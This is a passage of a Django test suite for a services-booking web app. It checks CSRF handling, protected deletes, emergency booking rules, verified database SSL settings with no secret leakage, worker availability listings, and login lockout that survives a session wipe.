    def test_popup_css_keeps_the_modal_hidden_until_opened(self):
        css = (
            Path(settings.BASE_DIR)
            / 'lamoapp' / 'static' / 'css' / 'dashboards-worker_dashboard.css'
        ).read_text(encoding='utf-8')

        self.assertIn('.chat-modal[hidden]', css)


class ProtectedServiceDeleteTest(TestCase):
    """P0-2: Booking.service is PROTECT, so deleting a used service must not 500."""

    def setUp(self):
        self.admin = CustomUser.objects.create_user(
            username='svc_admin',
            email='svc_admin@test.com',
            password='Password123!',
            role='ADMIN',
        )
        self.customer = _make_user('svc_customer')
        self.service = Service.objects.create(
            name='Deletable Service',
            description='probe',
            price=900.00,
            is_active=True,
        )
        self.worker = _make_worker('svc_worker', self.service)
        self.client.login(username='svc_admin', password='Password123!')

    def _delete(self, service=None):
        return self.client.post(
            reverse('service_delete', args=[(service or self.service).id])
        )

    def test_service_with_booking_is_not_deleted_and_does_not_500(self):
        booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(10),
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
        )

        response = self._delete()

        self.assertEqual(response.status_code, 302)
        self.assertTrue(Service.objects.filter(pk=self.service.pk).exists())
        # The booking and the worker->service link must survive untouched.
        self.assertTrue(Booking.objects.filter(pk=booking.pk).exists())
        self.worker.refresh_from_db()
        self.assertEqual(self.worker.service_id, self.service.id)

    def test_protected_delete_reports_a_friendly_message(self):
        Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(11),
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
        )
        response = self._delete()
        self.assertEqual(response.status_code, 302)
        shown = [str(m) for m in self.client.get(reverse('service_list')).context['messages']]
        self.assertTrue(any('Cannot delete' in m for m in shown), shown)

    def test_service_with_linked_worker_is_not_deleted(self):
        """WorkerProfile.service is SET_NULL: a silent delete would orphan workers."""
        response = self._delete()
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Service.objects.filter(pk=self.service.pk).exists())

    def test_unused_service_is_deleted_normally(self):
        spare = Service.objects.create(
            name='Unused Service',
            description='no bookings, no workers',
            price=100.00,
            is_active=True,
        )
        response = self._delete(spare)
        self.assertEqual(response.status_code, 302)
        self.assertFalse(Service.objects.filter(pk=spare.pk).exists())

    def test_delete_requires_post(self):
        response = self.client.get(reverse('service_delete', args=[self.service.id]))
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Service.objects.filter(pk=self.service.pk).exists())

class ProductionCsrfHardeningTest(TestCase):
    """P0-4: AJAX must not depend on reading the csrftoken cookie."""

    def setUp(self):
        self.user = _make_user('csrf_user')
        self.client.login(username='csrf_user', password='Password123!')
        self.notification = Notification.objects.create(
            recipient=self.user,
            notification_type='SYSTEM',
            message='probe',
        )

    def test_mark_as_read_works_when_csrf_cookie_is_httponly(self):
        with override_settings(CSRF_COOKIE_HTTPONLY=True):
            response = self.client.post(
                reverse('mark_notification_read', args=[self.notification.id]),
                HTTP_X_REQUESTED_WITH='XMLHttpRequest',
            )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()['success'])
        self.notification.refresh_from_db()
        self.assertTrue(self.notification.is_read)

    def test_mark_as_read_still_requires_a_valid_csrf_token(self):
        """CSRF protection itself must remain enabled in production."""
        client = Client(enforce_csrf_checks=True)
        client.login(username='csrf_user', password='Password123!')
        with override_settings(CSRF_COOKIE_HTTPONLY=True):
            response = client.post(
                reverse('mark_notification_read', args=[self.notification.id])
            )
        self.assertEqual(response.status_code, 403)
        self.notification.refresh_from_db()
        self.assertFalse(self.notification.is_read)

    def test_notifications_page_renders_csrf_meta_tag(self):
        with override_settings(CSRF_COOKIE_HTTPONLY=True):
            response = self.client.get(reverse('notifications'))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'name="csrf-token"')

    def test_base_layouts_expose_csrf_meta_tag(self):
        for name in (
            'templates/base.html',
            'templates/workers/worker_sidebar.html',
            'templates/admin/base_admin.html',
        ):
            html = Path(settings.BASE_DIR, name).read_text(encoding='utf-8')
            self.assertIn('name="csrf-token"', html, name)

    def test_js_reads_token_from_dom_not_only_from_cookie(self):
        notifications_js = Path(
            settings.BASE_DIR, 'lamoapp', 'static', 'js', 'notifications.js'
        ).read_text(encoding='utf-8')
        home = Path(settings.BASE_DIR, 'templates', 'home.html').read_text(encoding='utf-8')
        for source in (notifications_js, home):
            self.assertIn('meta[name="csrf-token"]', source)
            self.assertIn('csrfmiddlewaretoken', source)

class EmergencyBookingIntegrityTest(TestCase):
    """P1-4 / P1-5: accepted emergency jobs must respect the calendar and the trade."""

    def setUp(self):
        self.customer = _make_user('emerg_customer')
        self.plumbing = Service.objects.create(
            name='Plumbing', description='pipes', price=800.00, is_active=True
        )
        self.electrical = Service.objects.create(
            name='Electrical', description='wiring', price=900.00, is_active=True
        )
        self.plumber = _make_worker('emerg_plumber', self.plumbing)
        self.electrician = _make_worker('emerg_electrician', self.electrical)

    def _emergency(self, service, phone='9876543210', time='10:00-12:00'):
        return Booking.objects.create(
            customer=self.customer,
            worker=None,
            service=service,
            booking_type='Emergency',
            date=None,
            time=time,
            location='Ernakulam',
            description='burst pipe',
            phone=phone,
            district='Ernakulam',
            status='EMERGENCY_PENDING',
        )

    def _accept(self, worker, booking):
        self.client.login(username=worker.user.username, password='Password123!')
        return self.client.post(
            reverse('worker_accept_emergency', args=[booking.id])
        )

    def test_acceptance_stamps_a_date_so_it_occupies_the_calendar(self):
        booking = self._emergency(self.plumbing)
        self.assertEqual(self._accept(self.plumber, booking).status_code, 302)

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'ACCEPTED')
        self.assertEqual(booking.worker_id, self.plumber.id)
        self.assertEqual(booking.date, date_type.today())

    def test_accepted_emergency_blocks_a_later_booking_for_the_same_slot(self):
        booking = self._emergency(self.plumbing)
        self._accept(self.plumber, booking)

        # A normal booking on the same day/slot must now be refused.
        self.client.logout()
        self.client.login(username=self.customer.username, password='Password123!')
        self.client.post(reverse('book_service'), {
            'worker': self.plumber.id,
            'service': self.plumbing.id,
            'booking_type': 'One Time',
            'date': date_type.today().isoformat(),
            'time': '11:00-12:30',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'overlapping request',
        })

        self.assertFalse(
            Booking.objects.filter(worker=self.plumber, status='PENDING').exists(),
            'the accepted emergency job must block an overlapping booking',
        )

    def test_worker_on_leave_cannot_accept_emergency(self):
        WorkerLeave.objects.create(
            worker=self.plumber,
            leave_date=date_type.today(),
            reason='unavailable',
        )
        booking = self._emergency(self.plumbing)
        self._accept(self.plumber, booking)

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'EMERGENCY_PENDING')
        self.assertIsNone(booking.worker_id)

    def test_accepted_emergency_is_visible_to_later_conflict_checks(self):
        booking = self._emergency(self.plumbing)
        self._accept(self.plumber, booking)
        booking.refresh_from_db()
        self.assertTrue(
            Booking.objects.filter(
                worker=self.plumber,
                date=date_type.today(),
                status__in=['PENDING', 'ACCEPTED', 'IN_PROGRESS', 'COMPLETION_REQUESTED'],
            ).exists()
        )

    def test_worker_cannot_accept_another_services_emergency(self):
        booking = self._emergency(self.plumbing)
        self._accept(self.electrician, booking)

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'EMERGENCY_PENDING')
        self.assertIsNone(booking.worker_id)

    def test_correct_service_worker_can_accept(self):
        booking = self._emergency(self.plumbing)
        self._accept(self.plumber, booking)
        booking.refresh_from_db()
        self.assertEqual(booking.worker_id, self.plumber.id)

    def test_first_worker_wins_locking_is_preserved(self):
        booking = self._emergency(self.plumbing)
        self._accept(self.plumber, booking)
        self.client.logout()
        self._accept(self.electrician, booking)
        booking.refresh_from_db()
        self.assertEqual(booking.worker_id, self.plumber.id)

    def test_emergency_list_on_worker_dashboard_only_shows_own_service(self):
        plumbing_job = self._emergency(self.plumbing)
        electrical_job = self._emergency(self.electrical, phone='9000000000')

        self.client.login(username=self.plumber.user.username, password='Password123!')
        response = self.client.get(reverse('worker_manage_dashboard'))
        self.assertEqual(response.status_code, 200)

        listed = list(response.context['emergency_bookings'])
        self.assertIn(plumbing_job, listed)
        self.assertNotIn(electrical_job, listed)

    def test_emergency_list_is_empty_for_worker_without_service(self):
        self._emergency(self.plumbing)
        unassigned_user = CustomUser.objects.create_user(
            username='emerg_noservice', email='ns@test.com',
            password='Password123!', role='WORKER',
        )
        WorkerProfile.objects.create(
            user=unassigned_user,
            service=None,
            district='Ernakulam',
            availability='Full Time',
            work_status='AVAILABLE',
            is_verified=True,
        )
        self.client.login(username='emerg_noservice', password='Password123!')
        response = self.client.get(reverse('worker_manage_dashboard'))
        self.assertEqual(list(response.context['emergency_bookings']), [])

class DatabaseConfigurationTest(SimpleTestCase):
    """P0-3: DB credentials must come from the environment, not from source."""

    def test_settings_module_reads_db_config_from_env(self):
        source = Path(settings.BASE_DIR, 'lamo', 'settings.py').read_text(encoding='utf-8')
        self.assertIn('DATABASE_URL', source)
        self.assertIn("os.getenv('DJANGO_DB_USER'", source)
        self.assertIn("os.getenv('DJANGO_DB_PASSWORD'", source)

    def test_default_development_database_preserves_mysql_accounts(self):
        source = Path(settings.BASE_DIR, 'lamo', 'settings.py').read_text(encoding='utf-8')
        self.assertIn("os.getenv('DJANGO_DB_ENGINE', 'django.db.backends.mysql')", source)

    def test_no_hardcoded_password_literal_is_committed(self):
        source = Path(settings.BASE_DIR, 'lamo', 'settings.py').read_text(encoding='utf-8')
        self.assertNotRegex(source, r"'PASSWORD':\s*'[^']+'")
        self.assertNotRegex(source, r"'USER':\s*'root',")

    def test_env_example_documents_database_variables(self):
        example = Path(settings.BASE_DIR.parent, '.env.example').read_text(encoding='utf-8')
        for var in ('DATABASE_URL', 'DJANGO_DB_NAME', 'DJANGO_DB_USER',
                    'DJANGO_DB_PASSWORD', 'DJANGO_DB_HOST', 'DJANGO_DB_PORT'):
            self.assertIn(var, example, var)


class DatabaseSslConfigurationTest(SimpleTestCase):
    """Optional DJANGO_DB_SSL_* support: opt-in, verifying, and leak-free.

    The contract under test:
      * no SSL variables -> the pre-existing local MySQL OPTIONS are untouched;
      * a valid CA path  -> mysqlclient SSL options are produced;
      * missing CA / bad mode -> a clear ImproperlyConfigured, never a silent
        downgrade to an unverified connection;
      * no credential ever reaches an error message or a log record.
    """

    SECRET = 'Sup3r-Secr3t-Pa55w0rd-N3ver-In-Logs'

    def _temp_ca(self):
        """A real (dummy) PEM on disk so CA-path validation can pass."""
        handle, path = tempfile.mkstemp(suffix='.pem')
        os.close(handle)
        self.addCleanup(os.unlink, path)
        Path(path).write_text(
            '-----BEGIN CERTIFICATE-----\n'
            'ZmFrZSBjZXJ0aWZpY2F0ZSBmb3IgdGVzdGluZyBvbmx5\n'
            '-----END CERTIFICATE-----\n',
            encoding='utf-8',
        )
        return path

    def test_no_ssl_variables_returns_empty_options(self):
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': '', 'DJANGO_DB_SSL_CA': ''}):
            self.assertEqual(resolve_mysql_ssl_options(), {})

    def test_empty_string_values_are_treated_as_unset(self):
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': '   ', 'DJANGO_DB_SSL_CA': '  '}):
            self.assertEqual(resolve_mysql_ssl_options(), {})

    def test_no_ssl_variables_leave_settings_mysql_options_untouched(self):
        # settings.py imported this module with neither SSL variable set, so
        # the live MySQL OPTIONS must still be exactly the original pair.
        if os.environ.get('DJANGO_DB_SSL_MODE') or os.environ.get('DJANGO_DB_SSL_CA'):
            self.skipTest('DJANGO_DB_SSL_* exported in the ambient environment')
        from lamo import settings as project_settings
        options = project_settings.DATABASES['default']['OPTIONS']
        self.assertEqual(options, project_settings._MYSQL_OPTIONS)
        self.assertEqual(set(options), {'charset', 'init_command'})
        self.assertNotIn('ssl', options)
        self.assertNotIn('ssl_mode', options)

    def test_valid_ca_path_with_explicit_verify_identity(self):
        ca = self._temp_ca()
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY',
                                     'DJANGO_DB_SSL_CA': ca}):
            options = resolve_mysql_ssl_options()
        self.assertEqual(options['ssl_mode'], 'VERIFY_IDENTITY')
        self.assertEqual(options['ssl'], {'ca': ca})
        self.assertEqual(set(options), {'ssl_mode', 'ssl'})

    def test_mode_is_case_insensitive(self):
        ca = self._temp_ca()
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'verify_identity',
                                     'DJANGO_DB_SSL_CA': ca}):
            self.assertEqual(resolve_mysql_ssl_options()['ssl_mode'], 'VERIFY_IDENTITY')

    def test_missing_mode_defaults_to_verify_identity_when_driver_supports_it(self):
        ca = self._temp_ca()
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': '', 'DJANGO_DB_SSL_CA': ca}):
            options = resolve_mysql_ssl_options()
        # mysqlclient 2.2.8 documents VERIFY_IDENTITY, so it must be preferred.
        self.assertIn('VERIFY_IDENTITY', _mysql_driver_ssl_modes())
        self.assertEqual(options['ssl_mode'], 'VERIFY_IDENTITY')
        self.assertEqual(options['ssl'], {'ca': ca})

    def test_ssl_options_merge_on_top_of_existing_mysql_options(self):
        from lamo import settings as project_settings
        ca = self._temp_ca()
        merged = dict(project_settings._MYSQL_OPTIONS,
                      **resolve_mysql_ssl_options('VERIFY_CA', ca))
        self.assertEqual(merged['charset'], 'utf8mb4')
        self.assertEqual(merged['init_command'], "SET sql_mode='STRICT_TRANS_TABLES'")
        self.assertEqual(merged['ssl_mode'], 'VERIFY_CA')
        self.assertEqual(merged['ssl']['ca'], ca)

    def test_ssl_mode_without_ca_fails_clearly(self):
        with patch.object(Path, 'is_file', autospec=True, return_value=False):
            with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY',
                                         'DJANGO_DB_SSL_CA': ''}):
                with self.assertRaises(ImproperlyConfigured) as ctx:
                    resolve_mysql_ssl_options()
            message = str(ctx.exception)
            self.assertIn('DJANGO_DB_SSL_CA', message)
            self.assertIn('ca.pem', message)

    def test_relative_ca_path_resolved_against_base_dir(self):
        # Place test cert directly under BASE_DIR so relative path works across drives
        test_cert = settings.BASE_DIR / 'test_tmp_ca.pem'
        test_cert.write_text('-----BEGIN CERTIFICATE-----\ntest\n-----END CERTIFICATE-----\n', encoding='utf-8')
        self.addCleanup(lambda: test_cert.unlink(missing_ok=True))
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY',
                                     'DJANGO_DB_SSL_CA': 'test_tmp_ca.pem'}):
            options = resolve_mysql_ssl_options()
        self.assertEqual(options['ssl_mode'], 'VERIFY_IDENTITY')
        self.assertEqual(options['ssl'], {'ca': str(test_cert.resolve())})

    def test_automatic_ca_discovery_when_cert_file_exists(self):
        # Aiven ca.pem is present in lamo/cert/ca.pem
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY',
                                     'DJANGO_DB_SSL_CA': ''}):
            options = resolve_mysql_ssl_options()
        self.assertEqual(options['ssl_mode'], 'VERIFY_IDENTITY')
        self.assertTrue(options['ssl']['ca'].endswith('ca.pem'))
        self.assertTrue(Path(options['ssl']['ca']).is_file())

    def test_nonexistent_ca_file_fails_clearly(self):
        missing = str(Path(tempfile.gettempdir()) / 'lamo-definitely-missing-ca.pem')
        self.assertFalse(Path(missing).exists())
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_CA',
                                     'DJANGO_DB_SSL_CA': missing}):
            with self.assertRaises(ImproperlyConfigured) as ctx:
                resolve_mysql_ssl_options()
        message = str(ctx.exception)
        self.assertIn('DJANGO_DB_SSL_CA', message)
        self.assertIn('readable file', message)

    def test_ca_path_that_is_a_directory_fails_clearly(self):
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_CA',
                                     'DJANGO_DB_SSL_CA': tempfile.gettempdir()}):
            with self.assertRaises(ImproperlyConfigured) as ctx:
                resolve_mysql_ssl_options()
        self.assertIn('readable file', str(ctx.exception))

    def test_unrecognized_ssl_mode_is_rejected(self):
        ca = self._temp_ca()
        for bad in ('VERIFY_ALWAYS', 'VERIFY_HOST', 'not-a-mode', 'OPTIONAL'):
            with self.subTest(mode=bad):
                with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': bad,
                                             'DJANGO_DB_SSL_CA': ca}):
                    with self.assertRaises(ImproperlyConfigured) as ctx:
                        resolve_mysql_ssl_options()
                message = str(ctx.exception)
                self.assertIn('DJANGO_DB_SSL_MODE', message)
                self.assertIn('VERIFY_IDENTITY', message)

    def test_unverifying_modes_are_rejected_rather_than_silently_accepted(self):
        # DISABLED / PREFERRED / REQUIRED encrypt but do not verify, so they
        # must be refused: the task requires verification to never be disabled.
        ca = self._temp_ca()
        for bad in ('DISABLED', 'PREFERRED', 'REQUIRED'):
            with self.subTest(mode=bad):
                with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': bad,
                                             'DJANGO_DB_SSL_CA': ca}):
                    with self.assertRaises(ImproperlyConfigured) as ctx:
                        resolve_mysql_ssl_options()
                self.assertIn('verification cannot be disabled', str(ctx.exception))

    def test_allowed_modes_are_exactly_the_verifying_ones(self):
        from lamo import settings as project_settings
        self.assertEqual(set(project_settings._MYSQL_SSL_MODES),
                         {'VERIFY_IDENTITY', 'VERIFY_CA'})

    def test_mode_value_is_never_echoed_back_in_the_error(self):
        # A pasted secret in DJANGO_DB_SSL_MODE must not be reflected anywhere.
        ca = self._temp_ca()
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': self.SECRET,
                                     'DJANGO_DB_SSL_CA': ca}):
            with self.assertRaises(ImproperlyConfigured) as ctx:
                resolve_mysql_ssl_options()
        self.assertNotIn(self.SECRET, str(ctx.exception))

    def test_errors_never_contain_the_db_password(self):
        # The ambient password (never printed by this suite) must not appear
        # in any message the SSL resolver can raise.
        ca = self._temp_ca()
        password = os.environ.get('DJANGO_DB_PASSWORD', '')
        failures = [
            {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY', 'DJANGO_DB_SSL_CA': 'nonexistent_test_file.pem'},
            {'DJANGO_DB_SSL_MODE': self.SECRET, 'DJANGO_DB_SSL_CA': ca},
            {'DJANGO_DB_SSL_MODE': 'VERIFY_CA',
             'DJANGO_DB_SSL_CA': str(Path(tempfile.gettempdir()) / 'nope.pem')},
        ]
        for env in failures:
            with self.subTest(mode=env['DJANGO_DB_SSL_MODE']):
                with patch.dict(os.environ, env):
                    with self.assertRaises(ImproperlyConfigured) as ctx:
                        resolve_mysql_ssl_options()
                message = str(ctx.exception)
                self.assertNotIn(self.SECRET, message)
                if password:
                    self.assertNotIn(password, message)
                self.assertNotIn('PASSWORD=', message)

    def test_resolver_emits_no_log_records(self):
        ca = self._temp_ca()
        with patch.dict(os.environ, {'DJANGO_DB_SSL_MODE': 'VERIFY_IDENTITY',
                                     'DJANGO_DB_SSL_CA': ca,
                                     'DJANGO_DB_PASSWORD': self.SECRET}):
            # assertNoLogs fails the test if ANY record (even DEBUG) is emitted,
            # which is exactly the guarantee we want: nothing can be logged.
            with self.assertNoLogs(level='DEBUG'):
                resolve_mysql_ssl_options()
                # The failure paths must be silent too.
                with self.assertRaises(ImproperlyConfigured):
                    resolve_mysql_ssl_options('DISABLED', ca)
                with patch.object(Path, 'is_file', autospec=True, return_value=False):
                    with self.assertRaises(ImproperlyConfigured):
                        resolve_mysql_ssl_options('VERIFY_IDENTITY', '')

    def test_settings_source_has_no_hardcoded_ssl_credentials(self):
        source = Path(settings.BASE_DIR, 'lamo', 'settings.py').read_text(encoding='utf-8')
        self.assertIn('DJANGO_DB_SSL_MODE', source)
        self.assertIn('DJANGO_DB_SSL_CA', source)
        self.assertNotRegex(source, r'["\'][^"\']*\.pem["\']')
        self.assertNotRegex(source, r'PASSWORD["\']?\s*[:=]\s*["\'][^"\']+["\']')

    def test_env_example_documents_the_ssl_variables(self):
        example = Path(settings.BASE_DIR.parent, '.env.example').read_text(encoding='utf-8')
        for var in ('DJANGO_DB_SSL_MODE', 'DJANGO_DB_SSL_CA'):
            self.assertIn(var, example, var)
        self.assertRegex(example, r'(?m)^DJANGO_DB_SSL_MODE=$')
        self.assertRegex(example, r'(?m)^DJANGO_DB_SSL_CA=$')

    def test_installed_driver_reports_identity_verification(self):
        # Guard rail: the design assumes mysqlclient can verify identity.
        supported = _mysql_driver_ssl_modes()
        self.assertIn('VERIFY_IDENTITY', supported)
        self.assertIn('VERIFY_CA', supported)


class WorkerListMatchesBookingValidationTest(TestCase):
    """P1-6: the worker list must not offer anyone book_service would reject."""

    def setUp(self):
        self.customer = _make_user('listing_customer')
        self.service = Service.objects.create(
            name='Carpentry', description='furniture work', price=700.00, is_active=True
        )
        self.available = _make_worker('list_available', self.service)
        self.on_duty = _make_worker('list_onduty', self.service)
        self.on_duty.work_status = 'ON_DUTY'
        self.on_duty.save(update_fields=['work_status'])

        self.on_leave = _make_worker('list_leave', self.service)
        self.on_leave.work_status = 'LEAVE'
        self.on_leave.save(update_fields=['work_status'])

        self.suspended = _make_worker('list_suspended', self.service)
        self.suspended.work_status = 'SUSPENDED'
        self.suspended.save(update_fields=['work_status'])

        self.unverified = _make_worker('list_unverified', self.service)
        self.unverified.is_verified = False
        self.unverified.save(update_fields=['is_verified'])

        self.client.login(username='listing_customer', password='Password123!')
        self.url = reverse('service_workers', args=[self.service.id])

    def _listing(self, **params):
        query = {'district': 'Ernakulam'}
        query.update(params)
        return self.client.get(self.url, query)

    def _listed(self, response):
        return list(response.context['workers'])

    def _listed_worker(self, response, worker):
        """Return the *annotated* copy the view built for this worker."""
        for candidate in response.context['workers']:
            if candidate.pk == worker.pk:
                return candidate
        self.fail(
            f'{worker.user.username} was not listed at all '
            f'(listed: {[w.user.username for w in response.context["workers"]]})'
        )

    def test_list_hides_workers_who_cannot_be_booked(self):
        response = self._listing()
        self.assertEqual(response.status_code, 200)
        listed = self._listed(response)
        self.assertIn(self.available, listed)
        self.assertNotIn(self.on_duty, listed)
        self.assertNotIn(self.on_leave, listed)
        self.assertNotIn(self.suspended, listed)
        self.assertNotIn(self.unverified, listed)

    def test_every_listed_worker_is_flagged_bookable(self):
        response = self._listing()
        for worker in self._listed(response):
            self.assertTrue(
                worker.is_bookable,
                f'{worker.user.username} listed but not bookable: {worker.unavailable_reasons}',
            )
            self.assertEqual(worker.unavailable_reasons, [])

    def test_manual_worker_button_still_opens_existing_booking_modal(self):
        response = self._listing()

        self.assertContains(
            response,
            f'data-worker-id="{self.available.id}"',
        )
        self.assertContains(response, 'onclick="openBookingModal(this)"')
        self.assertContains(response, 'id="bookingModalForm"')
        self.assertContains(response, 'id="modalBookingMap"')

    def test_list_only_ever_contains_workers_booking_accepts(self):
        """The regression itself: every listed worker passes book_service."""
        cases = (
            {},
            {'date': _future_date_str(5)},
            {'date': _future_date_str(5), 'time': '10:00-12:00'},
        )
        for params in cases:
            with self.subTest(params=params):
                for worker in self._listed(self._listing(**params)):
                    worker.refresh_from_db()
                    self.assertEqual(worker.work_status, 'AVAILABLE')
                    self.assertTrue(worker.is_verified)

    def test_worker_on_leave_for_selected_date_is_marked_unavailable(self):
        target = _future_date_str(7)
        WorkerLeave.objects.create(
            worker=self.available, leave_date=target, reason='family event'
        )

        response = self._listing(date=target)

        listed = self._listed_worker(response, self.available)
        self.assertFalse(listed.is_bookable)
        self.assertIn('On leave on the selected date.', listed.unavailable_reasons)
        self.assertNotIn(listed, response.context['bookable_workers'])

    def test_same_worker_is_bookable_on_a_day_without_leave(self):
        target = _future_date_str(7)
        WorkerLeave.objects.create(
            worker=self.available, leave_date=target, reason='family event'
        )
        response = self._listing(date=_future_date_str(8))
        self.assertTrue(self._listed_worker(response, self.available).is_bookable)

    def _busy_booking(self, target, status='ACCEPTED'):
        return Booking.objects.create(
            customer=self.customer,
            worker=self.available,
            service=self.service,
            date=target,
            time='10:00-12:00',
            start_time=datetime_time(10, 0),
            end_time=datetime_time(12, 0),
            location='Ernakulam',
            phone='9876543210',
            status=status,
        )

    def test_overlapping_booking_marks_worker_unavailable(self):
        target = date_type.today() + timedelta(days=3)
        self._busy_booking(target)

        response = self._listing(date=target.isoformat(), time='11:00-13:00')

        listed = self._listed_worker(response, self.available)
        self.assertFalse(listed.is_bookable)
        self.assertIn(
            'Already booked for an overlapping time.',
            listed.unavailable_reasons,
        )

    def test_non_overlapping_booking_still_allows_booking(self):
        target = date_type.today() + timedelta(days=3)
        self._busy_booking(target)

        response = self._listing(date=target.isoformat(), time='14:00-16:00')
        self.assertTrue(self._listed_worker(response, self.available).is_bookable)

    def test_cancelled_booking_does_not_block_the_worker(self):
        target = date_type.today() + timedelta(days=3)
        self._busy_booking(target, status='CANCELLED')

        response = self._listing(date=target.isoformat(), time='11:00-13:00')
        self.assertTrue(self._listed_worker(response, self.available).is_bookable)

    def test_past_date_is_ignored_not_crashing(self):
        response = self._listing(date='2000-01-01', time='10:00-12:00')
        self.assertEqual(response.status_code, 200)
        self.assertIsNone(response.context['selected_date'])
        self.assertTrue(self._listed_worker(response, self.available).is_bookable)

    def test_malformed_date_is_ignored_not_crashing(self):
        response = self._listing(date='not-a-date', time='10:00-12:00')
        self.assertEqual(response.status_code, 200)
        self.assertIsNone(response.context['selected_date'])

    def test_listed_worker_actually_books_successfully(self):
        """End-to-end: what the list offers is what the booking view accepts."""
        target = _future_date_str(9)
        response = self._listing(date=target, time='10:00-12:00')
        self.assertTrue(response.context['bookable_workers'])

        self.client.post(reverse('book_service'), {
            'worker': self.available.id,
            'service': self.service.id,
            'booking_type': 'One Time',
            'date': target,
            'time': '10:00-12:00',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'booked from the listing',
        })
        self.assertTrue(
            Booking.objects.filter(worker=self.available, status='PENDING').exists()
        )

    def test_district_is_still_required(self):
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 302)

    def test_view_does_not_n_plus_one_per_worker(self):
        """Leave/busy data is resolved once for the whole page, not per worker."""
        for i in range(4):
            _make_worker(f'list_extra_{i}', self.service)
        WorkerLeave.objects.create(
            worker=self.available, leave_date=_future_date_str(5), reason='x'
        )
        with CaptureQueriesContext(connection) as ctx:
            self._listing(date=_future_date_str(5), time='10:00-12:00')
        self.assertLess(len(ctx.captured_queries), 12)


class RateLimitBypassTests(TestCase):
    """P1-7: brute-force / OTP limits must survive a session or cookie wipe."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()
        self.addCleanup(cache.clear)

        self.user = _make_user('rl_user')
        self.user.is_email_verified = True
        self.user.save(update_fields=['is_email_verified'])

    def _wipe_session(self):
        """Simulate the attacker clearing cookies / opening a new session.

        Both halves matter: the cookies are dropped *and* a brand new session
        is established, so any protection that lives in the old session is
        genuinely gone.
        """
        self.client.cookies.clear()
        self.client.session.flush()
        # SessionMiddleware only writes the (new) session cookie on a response,
        # so make one request to establish a fresh, empty session.
        self.client.get(reverse('login'))
        self.assertEqual(dict(self.client.session.items()), {})

    def _fail_login(self, username='rl_user', password='wrong'):
        return self.client.post(
            reverse('login'),
            {'username': username, 'password': password},
        )

    def _wsgi_request(self, ip='127.0.0.1'):
        """A bare request object for exercising the key builders directly."""
        from django.test import RequestFactory
        return RequestFactory().post(
            '/', REMOTE_ADDR=ip, HTTP_X_FORWARDED_FOR=ip,
        )



class LoginBruteForceIsServerSideTest(RateLimitBypassTests):
    def test_lockout_triggers_after_threshold(self):
        for _ in range(5):
            self._fail_login()
        response = self._fail_login()
        self.assertContains(response, 'Too many failed login attempts')

    def test_deleting_session_does_NOT_reset_login_lockout(self):
        for _ in range(4):
            self._fail_login()

        # Attacker's best move: throw the session away entirely.
        self._wipe_session()

        # The 5th failure still trips the server-side counter...
        self._fail_login()

        # ...and a brand new session is already locked out.
        self._wipe_session()
        response = self._fail_login()
        self.assertContains(response, 'Too many failed login attempts')

    def test_fresh_client_with_no_cookies_is_also_locked_out(self):
        for _ in range(5):
            self._fail_login()

        # A completely different client: no cookies, different session.
        attacker = Client()
        response = attacker.post(
            reverse('login'),
            {'username': 'rl_user', 'password': 'wrong'},
        )
        self.assertContains(response, 'Too many failed login attempts')

    def test_correct_password_is_refused_while_locked_out(self):
        for _ in range(5):
            self._fail_login()
        self._wipe_session()

        response = self._fail_login(password='Password123!')
        self.assertContains(response, 'Too many failed login attempts')
        self.assertNotIn('_auth_user_id', self.client.session)

    def test_successful_login_clears_the_counter(self):
        for _ in range(3):
            self._fail_login()
        self._fail_login(password='Password123!')
        self.assertIn('_auth_user_id', self.client.session)
        self.client.logout()
        # Counter cleared: a wrong password now gives the normal error
        # (a lockout would render the page, a normal failure re-renders it
        # too - so assert on the message, not the status code).
        self.assertContains(self._fail_login(), 'Invalid username or password')

    def test_lockout_is_scoped_per_username(self):
        for _ in range(5):
            self._fail_login(username='rl_user')
        # A different account from the same IP is unaffected.
        self.assertContains(
            self._fail_login(username='someone_else'),
            'Invalid username or password',
        )

    def test_counters_are_not_stored_in_the_session(self):
        self._fail_login()
        self.assertNotIn('login_attempts', self.client.session)
        self.assertNotIn('login_lockout_until', self.client.session)

    def test_rate_limit_keys_do_not_leak_the_username(self):
        from lamoapp.rate_limit import login_key
        key = login_key(self._wsgi_request(), 'rl_user')
        self.assertNotIn('rl_user', key)
        self.assertTrue(key.startswith('ratelimit:login:'))

    def test_normal_login_still_works(self):
        response = self._fail_login(password='Password123!')
        self.assertEqual(response.status_code, 302)
        self.assertIn('_auth_user_id', self.client.session)


class LoginRoleFlowTest(TestCase):
    def test_login_form_renders_username_and_password_fields(self):
        response = self.client.get(reverse('login'))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'name="username"')
        self.assertContains(response, 'name="password"')

